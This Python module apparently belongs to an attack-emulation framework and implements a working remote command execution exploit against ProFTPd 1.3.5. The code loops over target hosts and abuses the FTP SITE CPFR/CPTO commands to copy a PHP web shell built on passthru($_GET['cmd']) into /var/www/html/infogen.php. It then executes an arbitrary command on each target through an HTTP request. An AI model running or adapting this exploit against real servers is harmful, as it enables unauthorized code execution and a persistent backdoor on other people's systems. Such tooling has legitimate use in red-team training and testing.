"""
    This module realizes this exploit:
    https://www.exploit-db.com/exploits/36803/

    The results of attempting this attack on all detected FTP servers
    will be reported as C{{... host: summary_string ...}} in the dict under
    key C{proftpd_1_3_5_rce_result}.

    @requires: C{ftp_hosts}: a list of FTP hosts to attack
    @requires: C{proftpd_1_3_5_rce_cmd}: the command to execute remotely
"""
from abstract_circadence_phase import AbstractCircadencePhase
import socket
import logging
import requests


class proftpd_1_3_5_rce(AbstractCircadencePhase):
    TrackerId = 'proftpd_1_3_5_rce'
    Subject = 'proftpd_1.3.5_remote_command_execution'
    Description =   """
                    The 'proftpd_1_3_5_rce' phase executes code remotely
                    on a ProFTPd server of version 1.3.5
                    """

    required_input_parameters = {'hosts': None, 'RPORT': 21, 'command': None}
    output_parameters = {'ftp_result': None, 'proftpd_1_3_5_rce_result': None}

    def __init__(self, info):
        """
            Initialize the ProFTPd exploit.
            @requires: The C{info} dict has to have a key C{hosts} listing the
                remote hosts, a key C{RPORT}, and a key C{command} listing the
                command to execute on the remote host.
        """
        AbstractCircadencePhase.__init__(self, info=info)
        assert 'hosts' in info
        assert 'RPORT' in info
        assert 'command' in info

    def Setup(self):
        self._hosts = self.PhaseResult['hosts']
        self._port = int(self.PhaseResult['RPORT'])
        self._command = self.PhaseResult['command']
        return True

    def Run(self):
        """
            Run the exploit.
        """
        host_result = dict()

        for host in self._hosts:
            # tbh I don't understand this; I'm just copying code
            # (for the most part)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server = host
            directory = '/var/www/html/'  # <-- I'm not sure this is exactly right ...
            # evil = '<?php echo system("' + cmd + '") ?>'
            # evil = '<?php echo "u r hacked"; ?>'
            evil = "<?php echo passthru($_GET['cmd']); ?>"

            s.connect((server, self._port))
            s.recv(1024)

            self.PhaseReporter.Info('proftpd_1_3_5_rce is conncted to TCP on 21.')

            # I have no idea what this does, but it must be important.
            s.send(b"site cpfr /proc/self/cmdline\n")
            s.recv(1024)
            s.send(("site cpto /tmp/." + evil + "\n").encode("utf-8"))
            s.recv(1024)
            s.send(("site cpfr /tmp/." + evil + "\n").encode("utf-8"))
            s.recv(1024)
            s.send(("site cpto " + directory + "/infogen.php\n").encode("utf-8"))

            self.PhaseReporter.Info('proftpd_1_3_5_rce: payload sent, now executing.')

            r = requests.get('http://' + server + '/infogen.php?cmd=' + self._command)  # Executing PHP payload through HTTP
            self.PhaseResult['ftp_result'] = r.text
            if r.status_code == 200:
                # That was successful
                host_result[host] = 0
            else:
                host_result[host] = 'HTTP error: ' + str(r.status_code)

        self._progress = 99
        self.PhaseResult['proftpd_1_3_5_rce_result'] = host_result
        self._progress = 100
        return True


def create(info):
    """
        Create a new instance of the host port scanner object.
        @param info: initialization dictionary
        @return instance of the scanner object
    """
    return proftpd_1_3_5_rce(info)
